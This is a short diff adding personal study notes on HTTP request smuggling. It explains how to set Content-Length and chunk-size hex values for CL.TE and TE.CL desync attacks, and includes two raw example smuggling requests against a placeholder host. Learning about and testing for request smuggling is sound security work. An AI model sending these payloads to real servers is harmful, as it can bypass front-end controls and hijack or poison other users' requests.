@@ -1,0 +1,24 @@
+ Also for some payloads we have to put in the correct hex content length for the transfer encoding chunked header. Of course, this depends what configuration we find eg TE.CL vs CL.TE. Its very easy to look up payloads/hex values.
+
+
+** only CL.TE with use a 0 for the first hex value. TE.CL will need to have the correct hex value as per the length of the smuggled chunked request. 
+
+Ex. CL.TE
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+------------------------------
+EX. TE.CL -- NOTE the content length is only 3 here 
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
